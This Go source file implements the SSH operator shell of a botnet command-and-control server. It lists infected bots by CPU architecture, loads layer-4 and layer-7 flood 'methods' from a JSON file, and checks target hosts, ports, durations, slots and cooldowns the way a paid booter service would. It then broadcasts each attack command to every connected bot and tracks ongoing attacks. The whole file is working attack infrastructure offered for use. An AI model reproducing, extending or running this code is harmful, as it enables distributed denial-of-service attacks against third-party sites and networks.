package shell

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"

	"github.com/malasahjagotwin/cnc/internal/auth"
	"github.com/malasahjagotwin/cnc/internal/prompt"
)

type method struct {
	Name        string `json:"name"`
	Command     string `json:"command"`
	Description string `json:"description"`
	Layer       string
}

type methodSet map[string][]method

type Bot struct {
	Username string
	Remote   string
	Arch     string
}

type ClientLister func() []Bot
type Broadcaster func(string) int

type attack struct {
	ID    int
	Host  string
	Port  string
	Plan  int
	Start time.Time
}

func dataPath(name string) string {
	dir := "."
	if exe, err := os.Executable(); err == nil {
		d := filepath.Dir(exe)
		if _, err := os.Stat(filepath.Join(d, name)); err == nil {
			dir = d
		}
	}
	return filepath.Join(dir, name)
}

type Command struct {
	Name   string
	Help   string
	Hidden bool
	Run    func(s *Session, args []string) bool
}

type Session struct {
	channel  ssh.Channel
	term     *term.Terminal
	theme    prompt.Theme
	username string
	hostname string
	time     string
	slot     int
	cooldown int
	prompt   string
	commands map[string]Command
	clients  ClientLister
	cast     Broadcaster
	ongoing  []attack
	nextID   int
	slots    []time.Time
}

func New(channel ssh.Channel, theme prompt.Theme, user auth.User, hostname string, clients ClientLister, cast Broadcaster) *Session {
	t := term.NewTerminal(channel, "")
	s := &Session{
		channel:  channel,
		term:     t,
		theme:    theme,
		username: user.Username,
		hostname: hostname,
		time:     user.Time,
		slot:     user.Slot,
		cooldown: user.Cooldown,
		prompt:   theme.Build(user.Username, hostname),
		clients:  clients,
		cast:     cast,
		slots:    make([]time.Time, user.Slot),
	}
	s.commands = commandRegistry()
	return s
}

func (s *Session) print(text string) {
	io.WriteString(s.channel, text+"\r\n")
}

func (s *Session) clear() {
	io.WriteString(s.channel, "\x1b[H\x1b[2J\x1b[3J")
}

func (s *Session) SetSize(width, height int) {
	if width > 0 && height > 0 {
		s.term.SetSize(width, height)
	}
}

func (s *Session) Run() {
	defer s.channel.Close()

	s.clear()

	for {
		io.WriteString(s.channel, s.prompt)

		line, err := s.term.ReadLine()
		if err != nil {
			return
		}
		fields := strings.Fields(strings.TrimSpace(line))
		if len(fields) == 0 {
			continue
		}
		cmd, ok := s.commands[fields[0]]
		if !ok {
			continue
		}
		if cmd.Run(s, fields[1:]) {
			return
		}
	}
}

func commandRegistry() map[string]Command {
	cmds := map[string]Command{
		"help": {Name: "help", Help: "show command list", Run: cmdHelp},
		"whoami": {Name: "whoami", Help: "show current user", Run: func(s *Session, _ []string) bool {
			s.print(s.theme.Gradient(s.username))
			s.print("Time     : " + s.time + "s")
			s.print("Slot     : " + strconv.Itoa(s.slot))
			s.print("Cooldown : " + strconv.Itoa(s.cooldown) + "s")
			return false
		}},
		"clear": {Name: "clear", Help: "clear the screen", Run: func(s *Session, _ []string) bool {
			s.clear()
			return false
		}},
		"echo": {Name: "echo", Help: "echo back the arguments", Run: func(s *Session, args []string) bool {
			s.print(strings.Join(args, " "))
			return false
		}},
		"methods": {Name: "methods", Help: "show list of attack methods", Run: cmdMethods},
		"bots":     {Name: "bots", Help: "show connected clients", Run: cmdBots},
		"ongoing":  {Name: "ongoing", Help: "show running attacks", Run: cmdOngoing},
	}
	for _, m := range loadMethods() {
		cmds[m.Name] = Command{Name: m.Name, Help: m.Description, Hidden: true, Run: attackCmd(m)}
	}
	exit := Command{Name: "exit", Help: "leave the session", Run: func(s *Session, _ []string) bool {
		s.print(s.theme.Gradient("Goodbye!"))
		return true
	}}
	cmds["exit"] = exit
	cmds["quit"] = exit
	cmds["logout"] = exit
	return cmds
}

func loadMethods() []method {
	data, err := os.ReadFile(dataPath("method.json"))
	if err != nil {
		return nil
	}
	var sets methodSet
	if err := json.Unmarshal(data, &sets); err != nil {
		return nil
	}
	var out []method
	for _, layer := range []string{"L4", "L7"} {
		for _, m := range sets[layer] {
			m.Layer = layer
			out = append(out, m)
		}
	}
	return out
}

func cmdHelp(s *Session, _ []string) bool {
	seen := map[string]bool{}
	for _, c := range s.commands {
		if c.Hidden || seen[c.Name] {
			continue
		}
		seen[c.Name] = true
		s.print(s.theme.Gradient(c.Name) + "\x1b[0m — " + c.Help)
	}
	return false
}

func cmdMethods(s *Session, _ []string) bool {
	path := dataPath("method.json")

	data, err := os.ReadFile(path)
	if err != nil {
		s.print("error: cannot read " + path)
		return false
	}

	var sets methodSet
	if err := json.Unmarshal(data, &sets); err != nil {
		s.print("error: " + err.Error())
		return false
	}

	for _, layer := range []string{"L4", "L7"} {
		methods, ok := sets[layer]
		if !ok {
			continue
		}
		s.print(s.theme.Gradient(layer) + "\x1b[0m")
		for _, m := range methods {
			s.print(fmt.Sprintf("  %-8s %s", m.Name, s.theme.GradientUnderline(m.Description)))
		}
	}
	return false
}

func cmdBots(s *Session, _ []string) bool {
	var list []Bot
	if s.clients != nil {
		list = s.clients()
	}

	archs := map[string]int{}
	total := len(list)
	for _, b := range list {
		a := b.Arch
		if a == "" {
			a = "unknown"
		}
		archs[a]++
	}

	s.print(s.theme.Gradient("Total bots") + "\x1b[0m : " + strconv.Itoa(total))
	for _, a := range []string{"x86_64", "arm64", "x86", "arm", "mips", "unknown"} {
		if n, ok := archs[a]; ok {
			s.print(fmt.Sprintf("  %-7s : %d", s.theme.GradientUnderline(a), n))
		}
	}
	return false
}

func isNum(s string) bool {
	if s == "" {
		return false
	}
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}
	return true
}

func hasDigit(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] >= '0' && s[i] <= '9' {
			return true
		}
	}
	return false
}

func isIPish(s string) bool {
	hasDot := false
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '.' {
			hasDot = true
			continue
		}
		if c < '0' || c > '9' {
			return false
		}
	}
	return hasDot
}

func attackCmd(m method) func(s *Session, args []string) bool {
	layer := m.Layer
	name := m.Name
	exampleHost := "https://site.com"
	examplePort := "443"
	if layer == "L4" {
		exampleHost = "1.1.1"
		examplePort = "80"
	}
	example := fmt.Sprintf("example: %s %s %s 60", name, exampleHost, examplePort)
	return func(s *Session, args []string) bool {
		if len(args) != 3 {
			s.print(example)
			return false
		}
		host, port, dur := args[0], args[1], args[2]

		if !isNum(dur) {
			s.print(example)
			return false
		}
		durVal, _ := strconv.Atoi(dur)
		if limit, err := strconv.Atoi(s.time); err == nil && durVal > limit {
			s.print("time limit exceeded (max " + s.time + "s)")
			return false
		}

		if len(s.slots) > 0 {
			now := time.Now()
			free := -1
			for i, release := range s.slots {
				if release.IsZero() || now.After(release) {
					free = i
					break
				}
			}
			if free == -1 {
				s.print("no free slots, wait for one to clear")
				return false
			}
			s.slots[free] = now.Add(time.Duration(durVal+s.cooldown) * time.Second)
		}

		if layer == "L7" {
			if !strings.HasPrefix(host, "https://") {
				s.print(example)
				return false
			}
			rest := strings.TrimPrefix(host, "https://")
			if rest == "" || hasDigit(rest) {
				s.print(example)
				return false
			}
			if port != "443" && port != "80" {
				s.print("L7 port must be 443 or 80")
				return false
			}
		} else {
			if !isIPish(host) {
				s.print(example)
				return false
			}
			if !isNum(port) {
				s.print("L4 port must be numeric")
				return false
			}
		}

		cmd := m.Command
		if cmd == "" {
			cmd = fmt.Sprintf("%s %s %s %s", name, host, port, dur)
		}
		cmd = strings.ReplaceAll(cmd, "{host}", host)
		cmd = strings.ReplaceAll(cmd, "{port}", port)
		cmd = strings.ReplaceAll(cmd, "{time}", dur)

		plan := durVal
		s.nextID++
		s.ongoing = append(s.ongoing, attack{ID: s.nextID, Host: host, Port: port, Plan: plan, Start: time.Now()})

		sent := 0
		if s.cast != nil {
			sent = s.cast(cmd)
		}
		s.print(fmt.Sprintf("[+] %s sent to %d bot(s) [%s:%s %ss]", name, sent, host, port, dur))
		return false
	}
}

func cmdOngoing(s *Session, _ []string) bool {
	var alive []attack
	for _, a := range s.ongoing {
		if time.Since(a.Start) >= time.Duration(a.Plan)*time.Second {
			continue
		}
		alive = append(alive, a)
		remaining := int(time.Since(a.Start).Seconds())
		s.print(fmt.Sprintf("| %d | %s | %s | %ds", a.ID, a.Host, a.Port, a.Plan-remaining))
	}
	s.ongoing = alive
	if len(alive) == 0 {
		s.print("no ongoing attacks")
	}
	return false
}
